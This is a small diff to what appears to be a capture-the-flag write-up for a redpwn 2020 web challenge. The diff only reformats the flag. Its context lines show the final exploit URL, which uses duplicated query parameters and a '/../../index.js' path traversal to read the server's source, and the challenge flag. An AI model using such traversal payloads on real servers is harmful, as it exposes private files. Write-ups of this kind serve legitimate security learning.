@@ -31,4 +31,4 @@ One thing we notice is that we can pass an array in the query string through dup
 Final Exploit:
 https://tux-fanpage.2020.redpwnc.tf/page?path=a&path=/../../index.js
 
-Flag: flag{tr4v3rsal_Tim3}
+Flag: `flag{tr4v3rsal_Tim3}`
